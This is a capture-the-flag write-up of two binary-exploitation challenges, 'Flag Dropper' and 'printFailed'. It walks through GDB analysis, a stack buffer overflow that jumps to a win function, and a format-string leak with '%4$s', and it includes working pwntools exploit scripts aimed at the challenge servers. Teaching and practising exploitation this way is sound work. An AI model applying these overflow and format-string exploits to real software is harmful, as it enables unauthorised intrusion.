# pwn

## Flag Dropper
> Solved by Taz and thewhiteh4t

* After loading the binary in `GDB` we can list the functions
```
info functions
```

![](https://i.imgur.com/rbChpV2.png)

* here we can see that we have a `win` function
* win function disassembled :

```bash
gdb-peda$ disas win
Dump of assembler code for function win:
   0x00000000004005da <+0>:	mov    eax,0x0
   0x00000000004005df <+5>:	lea    rsi,ds:0x60109d
   0x00000000004005e7 <+13>:	lea    rdi,ds:0x601094
   0x00000000004005ef <+21>:	call   0x400440 <fopen@plt>
   0x00000000004005f4 <+26>:	mov    rdx,rax
   0x00000000004005f7 <+29>:	mov    eax,0x0
   0x00000000004005fc <+34>:	movabs rdi,0x601124
   0x0000000000400606 <+44>:	mov    esi,0x16
   0x000000000040060b <+49>:	call   0x400430 <fgets@plt>
   0x0000000000400610 <+54>:	mov    edi,0x1
   0x0000000000400615 <+59>:	mov    eax,0x1
   0x000000000040061a <+64>:	mov    edx,0x16
   0x000000000040061f <+69>:	syscall
   0x0000000000400621 <+71>:	jmp    0x4005d0 <_exit>
   0x0000000000400623 <+73>:	nop    WORD PTR cs:[rax+rax*1+0x0]
   0x000000000040062d <+83>:	nop    DWORD PTR [rax]
End of assembler dump.
```

* it is opening and reading some file
* now lets run the binary in GDB with a breakpoint in main

![](https://i.imgur.com/MMVX7lC.png)

* after some instructions we can see **flag.txt**
* I created a file named **flag.txt** with a fake flag inside it
* now I tried to execute the `win` function I found earlier

![](https://i.imgur.com/Zb62G51.png)

* great so win function is opening **flag.txt** and printing the flag
* now I looked for something which can execute the win function

![](https://i.imgur.com/0yJjSWN.png)

* we can see in the `code` section :

```
<main+142>: jmp QWORD PTR [rax]
```

* `jmp` is used for changing the flow of the programing , that means if we can provide the start address of `win` function to `jmp` it will execute it for us

* I found the offset at `73`

![](https://i.imgur.com/bovjmMe.png)

* Now lets find the start address of `win` function

```
gdb-peda$ print win
$1 = {<text variable, no debug info>} 0x4005da <win>
```

* Testing the offset in GDB :

```bash
# Payload
python -c "print('A' * 73 + 'BBBBBBBB')"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
```

![](https://i.imgur.com/6hrG88c.png)

* we have a small problem here, it seems like one of the A is extra so the offset should be 72 instead of 73

* Testing the new offset using pwntools with start address of `win` function :

```python
#!usr/bin/env python3

from pwn import *

offset = 72
addr = 0x4005da # Start address of win function

junk = b'A' * 72
le_num = p64(addr) # converted to little endian
buffer = junk + le_num 

elf = ELF('./flagDropper')
p = elf.process()
p.send(buffer)
out = p.recvall()
print(out)

```

* the script above runs the binary locally and sends our payload, here is the output :

![](https://i.imgur.com/fc0v22d.png)

* It works!, now I created a new script to send the payload on the server

```python
#!/usr/bin/env python3
    
from pwn import *
    
host = 'dropper.sdc.tf'
port = 1337
offset = 72
addr = 0x4005da # address of win function
    
junk = b'A' * offset
le_num = p64(addr)
    
buffer = junk + le_num
conn = remote(host, port)
conn.send(buffer)
flag = conn.recvuntil('}').decode()
print(f'\nFLAG : {flag}\n')
conn.close()
```

**OUTPUT :**

![](https://i.imgur.com/pu5NYoX.png)

---

## printFailed
> Solved By : thewhiteh4t

* Right from the start we get a segfault on this binary

```bash
./printFailed
zsh: segmentation fault (core dumped)  ./printFailed
```

* Let's investigate in GDB

![](https://i.imgur.com/91Rzavz.png)

* It's trying to open **flag.txt** but it does not exist, I created the file and relaunched the binary and it works now

```bash
./printFailed
can you guess the scrambled flag?
yes
you guessed:
yes
wrong
```

* It prints the input, let's look into GDB again
* A scramble function is called soon after the file is read
* Here we can see the scrambled flag : 

![](https://i.imgur.com/itwobGI.png)

```
"tedug|g5l4`gm5h~\v", '\001' <repeats 22 times>
```

* this looks familiar

```
tedug|g5l4`gm5h~\v
sdctf{f4k3_fl4g}
```

* so the input is shifted by 1 character!
* let's try to input the scrambled flag in the local binary

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF('./printFailed')

guess = b'tedug|g5l4`gm5h~\v' + b'\001' * 22

p = elf.process()
p.send(guess)
out = p.recv(4096)
print(out)
```

![](https://i.imgur.com/z5MuV9f.png)

* the scrambled flag works!
* but now the issue is that we don't know the actual flag so we cannot make a scrambled flag
* earlier we saw that the binary prints the input, this hints at `format string exploit`
* this article helped a lot in figuring out the way forward
* https://nikhilh20.medium.com/format-string-exploit-ccefad8fd66b
* https://man7.org/linux/man-pages/man3/printf.3.html

```
%s   -> string
%2$s -> 2nd argument
%3$s -> 3rd argument
```

* I tried them one by one and `%4$s` leaks the scrambled flag! 

![](https://i.imgur.com/kPVOxuG.png)

* Here is the final script and output :

```python
#!/usr/bin/env python3

from pwn import *

host = 'printf.sdc.tf'
port = 1337

payload = b'%4$s'

conn = remote(host, port)
conn.send(payload + b'\n')
res = conn.recv(4096).decode().split('\n')[2]
conn.close()

print(res)

for char in res:
    print(chr(ord(char) - 1), end='')
```

**OUTPUT :**

![](https://i.imgur.com/DCmtMWZ.png)